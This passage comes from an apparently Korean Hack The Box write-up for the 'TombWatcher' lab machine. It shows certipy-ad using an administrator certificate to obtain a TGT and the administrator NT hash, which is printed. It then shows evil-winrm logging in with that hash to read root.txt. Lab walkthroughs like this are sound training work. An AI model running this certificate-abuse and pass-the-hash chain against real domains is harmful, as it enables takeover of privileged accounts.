[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```

administrator hash 추출
```bash
┌──(kali㉿kali)-[~/HTB/TombWatcher]
└─$ certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.129.232.167' -domain 'tombwatcher.htb'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```

administrator 접속 후 root.txt 확인

```bash
evil-winrm -i 10.129.232.167 -u 'administrator' -H 'f61db423bebe3328d33af26741afe5fc'  
```
![[Pasted image 20260311133744.png]]
